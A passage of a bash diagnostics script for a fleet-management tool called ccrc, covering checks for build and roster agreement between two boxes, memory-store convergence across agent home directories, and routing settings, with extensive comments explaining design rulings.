  if [ "$addr_rc" -ne 0 ]; then
    # Configured and unusable is its own condition — but still a check that did
    # not run, not a finding about the fleet. The SOURCE is named and the value
    # is not: it comes off a config file and lands on a terminal.
    _dr_skip fleet "this box's server address cannot be used (${af[0]:-$BOX_ENV_FILE}), so nothing was asked — set CCRC_ADDR=host:port, or declare both CCRC_HOST and CCRC_PORT"
    return 3
  fi
  local addr="${af[0]}"

  local h_rc=0
  _box_health "$addr" || h_rc=$?
  case "$h_rc" in
    4)
      _dr_warn fleet "curl is not on PATH, so the server at $addr could not be asked whether the two boxes agree" \
        "install it: sudo apt install curl — the fleet host's own swap hook already needs it (deploy/notify.sh)"
      return 2 ;;
    5)
      _dr_warn fleet "the server at $addr did not answer (curl exited $BOX_HEALTH_WHY) — a server this box cannot reach is a different problem from two boxes that disagree" \
        "check the server is up and listening there: on the server box, systemctl --user is-active ccrc.service and journalctl --user -u ccrc.service -n 50"
      return 2 ;;
    6)
      _dr_warn fleet "the server at $addr answered $BOX_HEALTH_WHY when asked for /api/fleet/health, so it never said whether the two boxes agree" \
        "read the server's own log: on the server box, journalctl --user -u ccrc.service -n 50"
      return 2 ;;
    7)
      _dr_warn fleet "whatever is listening at $addr answered /api/fleet/health with something that is not the health JSON, so it is probably not a ccrc server" \
        "check what that address really is (a reverse proxy or a captive portal answers exactly this way), and that CCRC_HOST/CCRC_PORT name this box's own server"
      return 2 ;;
    8)
      _dr_warn fleet "node is not on PATH, so the server's answer could not be parsed" \
        "install Node first — see the 'node' check above"
      return 2 ;;
    9)
      # ── A SKIP, NOT A WARN, AND NOT THE OLD "read the server's log" (D-150) ──
      # This is the one non-200 that means NOTHING IS WRONG. `/api/fleet/health`
      # is gated on purpose (it publishes roster digests, build stamps and
      # divergence), so an armed box refusing an unauthenticated diagnostic is
      # both parties behaving correctly. Under code 6 this printed
      # "answered HTTP 401 … read the server's own log", which sends an operator
      # to a journal where there is nothing to find — on exactly the box the
      # runbook tells them to run doctor on immediately after arming the gate.
      #
      # WARN is wrong for it twice over: this doctor's rule is that a WARN owes a
      # REMEDY, and the only honest remedy here would be "turn the gate off",
      # which is not advice. And a yellow line every armed box shows on every run
      # is D-139's lesson exactly — the warnings that matter lose to the one
      # everybody learns to skim.
      #
      # THE COST IS REAL AND IS STATED, not glossed: on an armed box this check
      # no longer reports build skew or roster divergence, so its silence is not
      # evidence of agreement. What makes that affordable is that doctor is
      # DEGRADED, not wedged — it prints this line beside its own `auth` check
      # saying the gate is armed, and a human reading two adjacent lines can put
      # them together. (`ccrc version` on each box still compares the shas by
      # hand, which is why the sentence names it.)
      _dr_skip fleet "the server at $addr refused this check because its session gate is ARMED and /api/fleet/health is behind it (see the 'auth' check) — nothing is wrong at either end, but the two boxes cannot be compared from outside the gate, so build skew and roster divergence are NOT being measured on this box; compare by hand with 'ccrc version' on each"
      return 3 ;;
  esac

  local mode="${BOX_HEALTH[0]}" connected="${BOX_HEALTH[1]}"
  local build="${BOX_HEALTH[2]}" roster="${BOX_HEALTH[3]}"

  if [ "$mode" = local ]; then
    _dr_skip fleet "the server at $addr runs in local mode — it drives the fleet on its own box, so there is no second box to disagree with and nothing to compare"
    return 3
  fi
  if [ "$mode" != remote ]; then
    # Absent and unrecognised collapse HERE and only here, because an operator
    # does the same thing about both: look at what is answering.
    _dr_warn fleet "the server at $addr did not say which mode it is in, so this check cannot tell whether there are two boxes to compare" \
      "check the build running there — 'curl -s http://$addr/api/fleet/health' should answer with a mode of local or remote"
    return 2
  fi

  local rc=0
  if [ "$build" = skewed ]; then
    _dr_fail fleet "the two boxes are running different builds (the server at $addr answers build: skewed — the shas differ, or one of them is dirty and is therefore not the commit it names)" \
      "run 'ccrc rollout' from the deploying machine (release/rollout design §4), or 'ccrc update' on the lagging box — fleet box first, then the server box: the server reads what the fleet host's hook writes and the agent caches 'ccd caps' at boot, so the other order runs a server that reads fields the fleet host does not yet write. 'ccrc version' on each box names the sha it is running"
    rc=1
  fi
  if [ "$roster" = divergent ]; then
    _dr_fail fleet "the two boxes would run different ~/.ccrc/accounts.sh (the server at $addr answers roster: divergent), so ccd on the fleet host can behave differently from what the server assumes" \
      "REDEPLOY BOTH boxes first, agent first — the projection is a function of shared/generate.mjs as well as of the roster, so an emitter change that landed on one box only lands here with both accounts.json identical — and reconcile the two hand-owned ~/.ccrc/accounts.json second, which is the order the PWA's own banner states"
    rc=1
  fi

  # The WARN class. The unknowns share one line because they share one remedy:
  # the fleet host has not told the server what it is running.
  local -a soft=()
  case "$build" in
    agreed|skewed) ;;
    unknown) soft+=("the server cannot tell whether the builds match (build: unknown) — no build stamp has reached it from the fleet host") ;;
    *)       soft+=("the server answered something this check does not recognise where a build answer belongs") ;;
  esac
  case "$roster" in
    agreed|divergent) ;;
    unknown) soft+=("the server cannot tell whether the rosters match (roster: unknown) — no roster digest has reached it from the fleet host") ;;
    *)       soft+=("the server answered something this check does not recognise where a roster answer belongs") ;;
  esac
  if [ "${#soft[@]}" -gt 0 ]; then
    _dr_warn fleet "$(_dr_join ${soft[@]+"${soft[@]}"})" \
      "no evidence is not disagreement — run 'ccrc update' on the fleet host (fleet box first is the standing order) so its agent reports both, and check 'ccrc version' there: an unstamped box has nothing to report"
    [ "$rc" -eq 1 ] || rc=2
  fi

  # THE LINK IS ITS OWN FINDING, and it is why `agreed` alone is not enough for a
  # PASS: the server's answers are computed from what the fleet host last
  # reported, so over a dead link they describe the last contact rather than
  # now, and a PASS would claim a measurement nobody is currently making.
  #
  # THREE ARMS, NOT TWO (round-2 review, Important). This was
  # `if [ "$connected" = false ]`, which sent `?` — the classifier's token for
  # absent-or-unrecognised — down the same path as a healthy `true`, so four
  # different bodies (no `connected` at all; `"yes"`; `null`; the STRING
  # `"false"`) each produced `PASS fleet: … in remote mode, connected` — a
  # verdict asserting the opposite of what the last one says. The justification
  # written here was wrong as well as the code: `shared/api.ts:1926` declares
  # `connected` REQUIRED, so absence is a malformed answer, and the
  # absence-permits rule belongs to the optional pair `roster?`/`build?` and
  # licenses nothing here. `mode` and `build`/`roster` already WARN on a value
  # they do not recognise; this was the one field where an unrecognised answer
  # became a claim, and `_box_health` had carried the distinction all along —
  # narrowing it here is exactly the adapter rule CLAUDE.md calls its
  # highest-yield one.
  case "$connected" in
    true) ;;
    false)
      _dr_warn fleet "the server at $addr is not currently connected to the fleet host, so its build and roster answers describe the last contact rather than now" \
        "bring the link back up: on the fleet host, systemctl --user is-active ccrc-agent.service, then re-run this check"
      [ "$rc" -eq 1 ] || rc=2 ;;
    *)
      _dr_warn fleet "the server at $addr did not say whether it is in contact with the fleet host, so its build and roster answers cannot be trusted to describe now" \
        "check what is answering at $addr — /api/fleet/health states 'connected' as a JSON boolean (shared/api.ts declares it required), so a missing or non-boolean one means a proxy, an older build, or something that is not a ccrc server"
      [ "$rc" -eq 1 ] || rc=2 ;;
  esac

  if [ "$rc" -ne 0 ]; then
    return "$rc"
  fi
  _dr_pass fleet "the two boxes agree — same build, and the same generated ~/.ccrc/accounts.sh (measured by the server at $addr, in remote mode, connected)"
}

# ── memory convergence ────────────────────────────────────────────────────
# THE WHOLE DEFECT EXISTED BECAUSE A FORK IS SILENT. Nothing on this box
# reported that two homes disagreed about a project's memory, so a session read
# its own superseded record after an account swap and acted on it. A
# convergence mechanism without a detector only moves the silence one layer
# down: the next unconverged home forks exactly as `.claude-dev0` did.
#
# HOMES COME FROM THE FILESYSTEM, NOT THE ROSTER. `.claude-glm` and
# `.claude-kimi` are on disk, hold memory, and are in no roster entry — a
# roster-driven check would report PASS while the homes most likely to fork
# went unexamined.
#
# THE GLOB ITSELF IS STILL A NARROWER PROMISE THAN "every agent home", AND
# THAT IS A DOCUMENTED LIMIT, NOT FIXED HERE (whole-branch review, Important).
# It is `"$HOME"/.claude*/`, so a config dir whose suffix does not start with
# `.claude` — legal by `shared/roster.ts`'s own validator
# (`/^\.[A-Za-z0-9._-]+$/`, whose own error text suggests `.${id}`, e.g.
# `.kimi` for account id "kimi") — is invisible to this check exactly as it is
# invisible to `_mem_homes` (ccd/ccrc), while the hook
# (`_hook_memory_converge`) takes the home from the transcript path with no
# name filter at all and WOULD converge such a home regardless.
#
# THE WIDENING IS AVAILABLE — AND STILL NOT TAKEN. Reading
# `~/.ccrc/accounts.json` for `configDirSuffix` is no longer a technique
# nothing here uses: `_check_skills`, in this same file, enumerates its
# homes exactly that way (its node reader takes `a.id` and
# `a.configDirSuffix` off the roster). So the reason this check keeps the
# glob is NOT that the roster is out of reach; it is D-2181's four-site
# PARITY. `_mem_homes` (ccd/ccrc) is what the census and `ccrc memory
# --apply` enumerate with, and this check's verdict names `--apply` as its
# remedy. Widening only THIS copy would make doctor report — and hand that
# remedy for — a home `--apply` still cannot see or migrate: a verdict whose
# own fix is a no-op, which is a worse lie than today's shared blind spot.
# `_check_skills` is under no such constraint; its remedy is an installer
# that takes the home as an argument, so it can honestly name any home it
# can enumerate. A real fix here has to land in `_mem_homes`, this check and
# the hook together, or not at all.
#
# THREE CONDITIONS, NEVER TWO. "Forked" and "unreachable" have different
# remedies: the first is `ccrc memory --apply`, the second is wiring the home
# into `install-session-hooks.sh` (whose list is built from CCRC_ACCOUNTS, which
# is why a non-rostered home can never be hooked). Collapsing them sends the
# operator to the wrong fix. Since R33 they also carry different SEVERITIES —
# forked is a WARN, unreachable stays a FAIL — because a fork is the expected
# state of every multi-home box before its one-time migration, while an
# unreachable home is a misconfiguration nothing will ever repair on its own.
# See the WARN/FAIL calls at the bottom of this function for the full
# reasoning.
#
# THIS RE-DERIVES `_mem_homes`/`_mem_state` (ccrc's own memory functions)
# RATHER THAN SOURCING THEM — DELIBERATELY (D-92). `cmd_doctor` happens to
# source this file into the same shell where `ccrc` already defines those two
# functions, so calling them would technically work today. But this file is
# ALSO sourced standalone, under `set -u`, by callers that are not `ccrc`
# (this suite's own test harness does exactly that to read
# `CCRC_DOCTOR_CHECKS`), and D-92 (ccd/ccrc:971-981, pinned by
# ccrc-install.test.ts:2416-2425) is this repo's standing ruling that
# ccrc-doctor-checks must hold its own second spelling of anything it needs,
# rather than lean on a scope accident. Don't "fix" this duplication by
# reaching across a boundary that does not reliably exist.
#
# THE HOME GLOB ON A BOX WITH NO `.claude*` AT ALL: this check does not set
# nullglob itself, so `"$HOME"/.claude*/` expands to its own literal text
# when nothing matches — `_check_wrappers`, elsewhere in this file, toggles
# `shopt -s nullglob` on and restores it before returning (`:2410`/`:2420`),
# but that toggle lives and dies inside `_check_wrappers`' own subshell
# (`cmd_doctor` runs every check as `out="$( "_check_$name" )"`), so it can
# never leak into this one. The `[ -d "${h}projects" ]` guard right below is
# what makes an unmatched literal glob harmless either way — it is never a
# directory, so the loop body simply never runs and this check PASSes having
# measured a box with no agent homes at all. That PASS is vacuous, not a
# lie: there is nothing here that could have forked.
#
# EXTERNAL BINARIES ARE NOT BANNED HERE — `_check_caddyfile` calls `readlink`
# (`:1720`) and `_check_graphify-path` calls `realpath` twice (`:3575`-
# `:3576`), so "this file never shells out" would overstate its own practice.
# The real doctrine is D-1350 (`:3555`-`:3572`): a tool is fine to use, but
# its ABSENCE must become an unmeasured/SKIP outcome, never a narrowed or
# wrong verdict — an adapter may not narrow a distinction it received. This
# check still avoids `basename`/`readlink`/`grep` (below), but for a sharper
# reason than house style: this check's OWN test harness
# (`ccrc-doctor.test.ts`'s `doctorEnv`) runs every check against a PATH of
# only its own stub binaries, and unlike `stat`/`date`/`timeout`/`jq` (which
# `healthy()` explicitly links in), none of those three are ever linked —
# measured, they resolve to nothing there. Reaching for them would need this
# check to ALSO grow the SKIP/unmeasured handling D-1350 requires; writing it
# in bash builtins sidesteps needing that machinery at all:
# `${x%/}` then `${x##*/}` is `basename` in pure parameter expansion (the
# same idiom `_check_wrappers` already uses at `name="${f##*/}"`), and the
# settings.json scan below is a `read` loop rather than `grep`.
#
# CONVERGED MEANS THE LINK RESOLVES TO THE STORE *AND THE STORE IS A
# DIRECTORY* (R20, Task 4 review round 2 — see `_mem_state` in `ccd/ccrc` for
# the full ruling this mirrors). `[ "$link" -ef "$store" ]` alone answers only
# "resolves to something that exists" — it is TRUE for a link resolving to a
# regular FILE sitting where the store belongs, which is just as unusable a
# memory store as a dangling link but LOOKS nothing like one. Round 2's
# review measured this exact gap: `_check_memory` PASSed a box whose "store"
# was `: > $HOME/.ccrc/memory/<slug>`, a plain file. `[ -d "$store" ]` is
# therefore a SECOND, INDEPENDENT conjunct, not implied by `-ef` — deleting it
# alone (leaving `-ef` in place) reproduces exactly that false PASS. `-ef`
# still does the other half of the job for free: it compares device+inode
# THROUGH the symlink (the same operator `_check_wrappers` already uses for
# its own alias detection), so a RELATIVE link that genuinely resolves to the
# store reads as converged without any `readlink` at all — a bare dangling
# link (nothing to stat on either side) or a link naming a different file
# both fail `-ef` on that fact alone.
#
# `[ -e "$link" ] || [ -L "$link" ] || continue`, NOT `[ -e "$link" ] ||
# continue`: `-e` DEREFERENCES, so it is false for a dangling symlink —
# exactly the pair the rule above calls forked, because its target text is
# right but nothing is behind it. Skipping past it here would let doctor PASS
# a box the census (`ccrc memory`) calls forked (R10 — the same defect Task 2
# and Task 3 each hit once already on this branch).
#
# THREE SETTINGS.JSON SHAPES, NOT TWO (R22 + a Minor, Task 4 review round 2).
# `install-session-hooks.sh:107-115` writes `cur='{}'` and proceeds to insert
# the hook for ANY rostered home that has no settings.json at all — so a
# missing file is not "nothing to report", it is proof the installer has
# never touched this home, the MAXIMAL case of "will fork on first use".
# Round 1 of this check only ever examined a settings.json that existed,
# which silently PASSed exactly the home most likely to fork (measured:
# `.claude-kimi/projects/` with no settings.json at all read as converged).
# The third shape is a settings.json that EXISTS but cannot be READ (mode
# problem, not a content problem): folding that into "unreachable" would be
# the overloaded-null defect this codebase bans by name yet again — D-1350's
# "an adapter may not narrow a distinction it received" applies here just as
# it does to a missing `realpath`. "I could not read it" and "it is
# definitely not wired" are different facts an operator fixes differently
# (a permissions fix vs. a roster/settings.json edit), so an unreadable file
# earns its own WARN, `unmeasured`, with its own remedy — never silently
# promoted to the FAIL a confirmed-absent hook gets. `[ -r "${h}settings.json" ]`
# is checked BEFORE ever opening the file for exactly this reason too: a
# `while read … done < file` whose open() fails leaks bash's own permission-
# denied diagnostic to the REAL stderr (redirections are set up left to right,
# so a trailing `2>/dev/null` on that same line cannot catch the failure of
# the `<` that precedes it) — refusing to attempt the open at all is simpler
# than getting that ordering right, and it is what makes the WARN path clean.
#
# R21 (Task 4 review round 2): a box can be forked AND carry an unreachable
# home AND carry an unmeasured one, all at once, and this check now answers
# in all three classes rather than picking the loudest and discarding the
# rest — `ccrc-doctor-checks`'s own header rules exactly this ("ONE CHECK MAY
# ANSWER IN TWO (OR MORE) CLASSES": distinct findings are distinct operator
# actions, so each gets its own line and its own remedy). The instruction
# that shipped round 1's early-return ("emit exactly one verdict line or
# doctor's tallies go inconsistent") was wrong: `cmd_doctor` counts VERDICT
# LINES, not a fixed arity per check — the counting loop and the comment that
# rules it are `ccd/ccrc:1990`-`:2007`, and the contract the count then has to
# satisfy (the return code must be the WORST class the check printed, or the
# check is failed as a ccrc bug) is `ccd/ccrc:2048`-`:2063` — so a fork on one
# home and an unreachable finding on an unrelated home are computed
# independently below and BOTH printed — dropping either one is silence about
# a real finding, which is the one thing this whole task exists not to do.
# SINCE R33 THE TWO ARE NO LONGER BOTH FAIL: a forked-and-unreachable box now
# prints one WARN line and one FAIL line, and the worst-class cross-check at
# `ccd/ccrc:2048`-`:2063` still picks FAIL as the return code — `unreachable`
# alone is what can still fail `ccrc update`.
#
# NO `.claude-docserver` SPECIAL CASE, DELIBERATELY (Minor, whole-branch
# review round 3 — reached independently of `_mem_homes`'s identical guard in
# ccd/ccrc, which is owned by other work in this wave, but for the same
# reason). It used to be excluded by name in this loop. Removed because (a)
# hard-coding one operator's box-local tool's directory name into shipped,
# public-release-bound source is exactly the residue class the top-level
# CLAUDE.md bans by name ("no account-name list in ANY shipped source file"),
# and this tree is not supposed to know `.claude-docserver` exists at all —
# it is "operator plumbing this tree does not know about", the same phrase
# that CLAUDE.md uses to keep Tailscale out of this codebase; (b) it excluded
# nothing measurable: `~/.claude-docserver` carries no `projects/` directory
# on the box it was written for, so the very next line
# (`[ -d "${h}projects" ] || continue`) already skips it. If some future box's
# docserver ever does grow a `projects/` directory, treating it like any other
# `.claude*` directory is the right answer — a silent blind spot for a name
# this tool has no business knowing is worse than one more row in the census.
_check_memory() {
  # A server-role box hosts no sessions (D-3111): the installer converges
  # nothing per account there, so this check measures nothing there either —
  # the same sentence `_check_skills` has said since it shipped. `-f` before
  # `-r` (D-3025).
  local _srv_role=""
  # `${BOX_ENV_FILE:-}`: this file is sourced under `set -u` by callers that
  # are not `ccrc` (a test sources it bare and calls one check), so a bare
  # `$BOX_ENV_FILE` here is an unbound-variable death, not a skipped gate.
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip memory "this box records CCRC_ROLE=server, so it hosts no sessions and no agent home's memory on it is ccrc's concern"
    return 3
  fi
  local h b d slug link store forked="" unreachable="" unmeasured="" line hooked rc=0
  for h in "$HOME"/.claude*/; do
    b="${h%/}"; b="${b##*/}"
    [ -d "${h}projects" ] || continue
    if [ ! -f "${h}settings.json" ]; then
      # R22: never touched by install-session-hooks.sh — the maximal case of
      # "will fork on first use".
      unreachable="${unreachable:+$unreachable }$b"
    elif [ -r "${h}settings.json" ]; then
      hooked=0
      while IFS= read -r line || [ -n "$line" ]; do
        case "$line" in *session-hook.sh*) hooked=1; break ;; esac
      done < "${h}settings.json"
      [ "$hooked" -eq 1 ] || unreachable="${unreachable:+$unreachable }$b"
    else
      unmeasured="${unmeasured:+$unmeasured }$b"
    fi
    for d in "${h}projects"/*/; do
      [ -d "$d" ] || continue
      slug="${d%/}"; slug="${slug##*/}"
      # THE PATTERN LIST IS SPELLED HERE, and that is D-92's trade rather
      # than an oversight — the same one this file already records for `ccd`'s
      # `POOL_NAME_RE`: this table is sourced under `set -u` by things that are
      # NOT `ccrc` (`ccrc-doctor.test.ts`'s `tableNames()`), so it cannot reach
      # `_mem_is_scratch`, and a `declare -F` guard would be the second
      # spelling with a branch in front of it. `single-definition.test.ts`
      # compares all three literals and reds on a drift. `_mem_is_scratch` in
      # `ccrc` carries the rule and the measurement (D-2375; A4 adds the child root).
      case "$slug" in -tmp*|-private-tmp*|-var-folders*|-private-var-folders*|*--cc-tmp-*) continue ;; esac
      link="${d}memory"
      [ -e "$link" ] || [ -L "$link" ] || continue
      store="$HOME/.ccrc/memory/$slug"
      [ "$link" -ef "$store" ] && [ -d "$store" ] && continue
      forked="${forked:+$forked }$b:$slug"
    done
  done
  if [ -n "$forked" ]; then
    # R33 (controller ruling — implemented, not relitigated): WARN, not FAIL.
    # `cmd_install` ends with `cmd_doctor` in both role arms, and `cmd_doctor`
    # returns 1 the moment any check FAILs, so a FAIL here hard-dies
    # `cmd_update` (`_ccrc_die`) BEFORE `_upd_sweep` ever runs — the fleet's
    # ~20 `claude-session@*` supervisors keep running the OLD ccd while the
    # operator reads a message naming doctor, never the sweep it silently
    # skipped. And this check FAILs on `forked` BY CONSTRUCTION on every box
    # that has ever run more than one agent home, until the operator runs the
    # one irreversible `ccrc memory --apply` — so an unrelated verb (`ccrc
    # update`) was coercing operators into that migration to make itself
    # succeed. `unreachable` below is not the same kind of finding and stays
    # FAIL: a fork is the expected PRE-MIGRATION state of every multi-home
    # box, but an unreachable home is a misconfiguration nothing will ever
    # repair on its own. The three conditions this check answers in are still
    # never collapsed to two — they now carry two severities instead of one,
    # which is what the difference in their remedies actually means. A WARN
    # still prints with its own remedy, and `cmd_doctor` still counts it —
    # it just cannot fail `ccrc update`.
    _dr_warn memory "memory is forked across agent homes: $forked" \
      "one store per project: run \`ccrc memory\` to see the census, then \`ccrc memory --apply\`"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ -n "$unreachable" ]; then
    _dr_fail memory "agent homes the session hook cannot reach, so they will fork on first use: $unreachable" \
      "add the account to the roster so install-session-hooks.sh wires it, or register session-hook.sh in that home's settings.json by hand"
    rc=1
  fi
  if [ -n "$unmeasured" ]; then
    _dr_warn memory "could not tell whether the session hook reaches every agent home — settings.json exists but could not be read for: $unmeasured" \
      "fix its permissions so doctor can read it (chmod u+r <home>/settings.json), or check by hand whether it references session-hook.sh"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "$rc" -eq 0 ]; then
    _dr_pass memory "one memory store per project; every agent home converged"
  fi
  return "$rc"
}

_check_routing() {
  # A server-role box hosts no sessions (D-3111): the installer converges
  # nothing per account there, so this check measures nothing there either —
  # the same sentence `_check_skills` has said since it shipped. `-f` before
  # `-r` (D-3025).
  local _srv_role=""
  # `${BOX_ENV_FILE:-}`: this file is sourced under `set -u` by callers that
  # are not `ccrc` (a test sources it bare and calls one check), so a bare
  # `$BOX_ENV_FILE` here is an unbound-variable death, not a skipped gate.
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip routing "this box records CCRC_ROLE=server, so it hosts no sessions and no lane's settings.json on it is ccrc's concern"
    return 3
  fi
  # Routing spec 2026-09-14 §5.2 / §8: on an Anthropic lane the subagent floor
  # rides the spawn PROCESS ENV (`CLAUDE_CODE_SUBAGENT_MODEL`, composed by ccd
  # from the routing record), which a `settings.json` env key would override
  # silently; and CLAUDE_CODE_EFFORT_LEVEL overrides every effort control and
  # must appear nowhere. A text scan, like `_check_memory`: presence is the
  # fact. A box with no projection or no Anthropic lane has nothing that could
  # contradict the rule and PASSES vacuously, in those words — not a SKIP: the
  # doctor's own healthy fixture has no projection, and a check that skips
  # there is a check that cannot be counted.
  local sh="$HOME/.ccrc/accounts.sh" raw="" eff="" sub="" unread="" a d f line n=0 sn=0 he hs rc
  if [ ! -r "$sh" ]; then
    _dr_pass routing "0 Anthropic lane(s): no roster projection at \$HOME/.ccrc/accounts.sh, so no settings.json can override the routing record's spawn env (the wrappers check owns the roster's health)"
    return 0
  fi
  # An unsourceable projection (corrupt file, `.` fails) and a projection that
  # sources fine but predates one of the routing arrays (`declare -p` fails) are
  # NOT "the roster declares no Anthropic-backend account" — that PASS is
  # reserved for an array that IS declared, with zero elements. Folding all
  # three into one empty `raw` would report green having measured nothing, so
  # this is its own probe, done first and separately from building `raw`.
  #
  # BOTH ARRAYS, not just the backend one (fix round 2, Finding 1b). `ccrc
  # install` writes `CCRC_ANTHROPIC_BACKEND` and `CCRC_SUBAGENT_CLASSES` from
  # the same generator in the same file, but they arrived in different
  # releases — the second is routing slice 1's — so a box last installed
  # between them has the first and not the second, and ccd cannot validate a
  # `subagent` routing field there at all (`_route_valid` answers "unmeasured"
  # and the field fails closed). Probing only the array that predates the
  # feature is S1-R9's vacuous-green shape one array over: a green line whose
  # subject was never measured. One `&&`, one remedy, the same sentence.
  if ! ( . "$sh" 2>/dev/null \
         && declare -p CCRC_ANTHROPIC_BACKEND >/dev/null 2>&1 \
         && declare -p CCRC_SUBAGENT_CLASSES >/dev/null 2>&1 ); then
    _dr_warn routing "could not read the roster projection at \$HOME/.ccrc/accounts.sh, or it predates the routing arrays (CCRC_ANTHROPIC_BACKEND, CCRC_SUBAGENT_CLASSES)" \
      "re-run ccrc install to regenerate it, or check the Anthropic lanes' settings.json by hand for CLAUDE_CODE_SUBAGENT_MODEL and CLAUDE_CODE_EFFORT_LEVEL"
    return 2
  fi
  raw="$( . "$sh" 2>/dev/null && for a in "${CCRC_ANTHROPIC_BACKEND[@]}"; do printf '%s\t%s\n' "$a" "$(_ccrc_cfg_dir "$a")"; done )"
  if [ -z "$raw" ]; then
    _dr_pass routing "0 Anthropic lane(s): the roster declares no Anthropic-backend account, so no settings.json can override the routing record's spawn env"
    return 0
  fi
  # TWO KEYS, TWO SEVERITIES (controller ruling S1-R13). The scan used to fold
  # both names into one `bad` list and one FAIL, and that FAIL is not a finding
  # about this box's configuration — it is a finding about the fleet's own
  # earlier mechanism. `CLAUDE_CODE_SUBAGENT_MODEL` in a lane's settings.json
  # PREDATES the routing record (the 2026-09-07 subagent-routing ruling put it
  # there deliberately, so subagents would stop inheriting an orchestrator's
  # model), so a box that honoured that ruling FAILs here BY CONSTRUCTION — and
  # `cmd_install` ends with `cmd_doctor`, whose rc `cmd_update` turns into
  # `_ccrc_die` BEFORE `_upd_sweep`, so the FAIL did not merely print: it
  # half-landed every `ccrc update` on that box (new executables on disk, live
  # supervisors still executing the old ccd) until an operator edited three
  # lane config dirs. Exactly `_check_memory`'s `forked` shape, and it takes the
  # same answer: WARN, with its own remedy, countable by doctor and unable to
  # fail `ccrc update`. The two keys are NOT the same kind of finding —
  # `CLAUDE_CODE_EFFORT_LEVEL` overrides every effort control and has no
  # sanctioned writer anywhere (spec §5.2, §8), so it stays a FAIL, and the
  # lists stay separate so each line names only the lanes its own key was
  # measured on. A lane carrying BOTH is an effort lane: the FAIL wins, and it
  # is the arm whose remedy the operator must act on.
  while IFS=$'\t' read -r a d; do
    [ -n "$a" ] || continue
    n=$((n + 1)); f="$d/settings.json"
    [ -e "$f" ] || continue
    [ -r "$f" ] || { unread="${unread:+$unread }$a"; continue; }
    he=0; hs=0
    while IFS= read -r line || [ -n "$line" ]; do
      case "$line" in *CLAUDE_CODE_EFFORT_LEVEL*) he=1 ;; esac
      case "$line" in *CLAUDE_CODE_SUBAGENT_MODEL*) hs=1 ;; esac
      if [ "$he" -eq 1 ] && [ "$hs" -eq 1 ]; then break; fi
    done < "$f"
    if [ "$he" -eq 1 ]; then
      eff="${eff:+$eff }$a"
    elif [ "$hs" -eq 1 ]; then
      sub="${sub:+$sub }$a"; sn=$((sn + 1))
    fi
  done <<<"$raw"
  if [ -n "$eff" ]; then
    _dr_fail routing "an Anthropic lane's settings.json names CLAUDE_CODE_EFFORT_LEVEL, which overrides every effort control — the routing record's effort field included: $eff" \
      "remove the key from that lane's settings.json — the effort override must not exist; effort is chosen per session by the routing record (ccd route)"
    return 1
  fi
  rc=0
  if [ -n "$sub" ]; then
    # THE LIVE-SESSION CENSUS (Task 5). `sub`'s WARN predates the routing
    # record entirely (S1-R13's own comment above), so it cannot stay a WARN
    # forever: once every LIVE session already carries a routing record
    # (`$reg/<id>.class`), the key is no longer inert-by-accident — it is the
    # only thing still overriding a record that exists. That is the FAIL this
    # arm was always missing, and it is evaluated ONLY here, because a census
    # nobody will read if `sub` is empty is a census not worth running.
    #
    # THREE ANSWERS, matching `_svc_is_active`'s own three-way shape one level
    # up: `systemctl --user is-active claude-session@<id>.service` exits 0
    # (live), 3 (systemd's own "not active" — inactive or failed, a measured
    # NOT-live), or anything else (the manager did not answer the question at
    # all). Collapsing the third into the second would let an unreachable bus
    # or a missing systemctl fabricate the very zero this arm FAILs on — the
    # false PASS `_svc_is_active`'s own comment names, one severity over. So
    # `$reg` absent (the SERVER box owns no `~/.cc-sessions` at all — this
    # doctor also runs there, `_check_pools` above is the same measurement one
    # check up), a launchd box (this census is systemd-shaped and never asks
    # launchctl anything — see the darwin branch below), no service manager
    # on this box, or an `is-active` that answers neither 0 nor 3 for some id
    # — each makes the census UNMEASURED, and the arm stays WARN saying so,
    # never FAIL on a fabricated zero.
    #
    # RULING S5-R12 (controller, fix round 2): the census FAILs ONLY when it
    # measured a real, fully-recorded population — live >= 1 AND missing == 0.
    # A registry that measures ZERO live sessions at all is its OWN WARN,
    # distinct from both "unmeasured" and "missing > 0": nothing was observed
    # to be overridden, so FAILing there (as this arm used to) would abort
    # `ccrc update` before `_upd_sweep` on a rebooted or dev box that never
    # ran a session the key could have collided with.
    local reg="$HOME/.cc-sessions" sf id scrc missing=0 shown=0 missing_ids="" \
      live=0 census=measured why=""
    local _sub_lead="$sn Anthropic lane(s) pin CLAUDE_CODE_SUBAGENT_MODEL in settings.json: $sub — the routing record's subagent field is overridden there until the key is removed"
    # RULING S5-R19: "carries a routing record" here means "has a `.class`
    # field" — `default` included, because the operator's own choice of "no
    # override" is still a record. This census asks a DIFFERENT question
    # than `POST /api/runs/:id/route` does ("is on a rung of the ladder") —
    # both are right, they just answer different things about the same file.
    local _sub_remedy="remove the key from those lanes' settings.json once every session carries a routing record (a \`.class\` field, \`default\` included), or keep it and treat the record's subagent field as inert on them"
    # `$reg` UNSEARCHABLE IS NOT `$reg` ABSENT, and the absence branch below
    # cannot tell them apart — the same D-1848 shape `_check_pools` above
    # already guards against on its own registry read, checked FIRST here for
    # the identical reason: `-d "$reg"` on a mode-000 directory still answers
    # TRUE (stat needs search on the PARENT, not on the dir itself), so `for
    # sf in "$reg"/*.uuid` below would silently match nothing and this census
    # would read a present-but-unlistable registry as a measured zero — the
    # exact fabricated zero this arm exists not to FAIL on.
    if { [ -e "$reg" ] || [ -L "$reg" ]; } && { [ ! -d "$reg" ] || [ ! -x "$reg" ] || [ ! -r "$reg" ]; }; then
      census=unmeasured
      why="$reg is not a searchable, readable directory, so no id under it could be enumerated"
    elif [ ! -d "$reg" ]; then
      census=unmeasured
      why="no session registry at $reg (a server box that runs no fleet sessions of its own owns none)"
    elif [ "${CCD_OS:-linux}" = darwin ]; then
      # `_have_systemctl` answers "can this box supervise a session at all",
      # so on darwin it tests for launchctl, not systemctl (ccd:615-618) — it
      # answers TRUE on an ordinary Mac (launchctl present) and would let the
      # `else` branch below invoke a `systemctl` that plain does not exist
      # there (exit 127, misread by the loop as "answered neither active nor
      # inactive"). Never call it: a launchd box is unmeasured for this
